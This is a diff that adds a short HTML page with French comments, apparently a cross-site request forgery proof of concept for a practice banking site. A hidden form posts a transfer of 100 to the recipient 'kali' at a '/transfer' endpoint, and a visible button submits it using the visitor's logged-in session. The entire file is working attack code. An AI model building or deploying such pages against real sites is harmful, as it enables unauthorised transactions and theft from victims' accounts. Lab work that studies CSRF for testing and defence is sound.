@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit CSRF - Test</title>
+</head>
+<body>
+    <h1>Test CSRF</h1>
+    <p>Clique sur ce bouton pour tester un transfert CSRF avec ton compte.</p>
+
+    <!-- Formulaire piégé -->
+    <form action="http://bankme-v1.com/transfer" method="post" style="display:none;">
+        <!-- Destinataire -->
+        <input type="hidden" name="recipient" value="kali">
+        <!-- Montant -->
+        <input type="hidden" name="amount" value="100">
+        <input type="submit" id="csrf-submit">
+    </form>
+
+    <!-- Bouton pour déclencher manuellement -->
+    <button onclick="document.getElementById('csrf-submit').click();">
+        Tester le CSRF
+    </button>
+</body>
+</html>
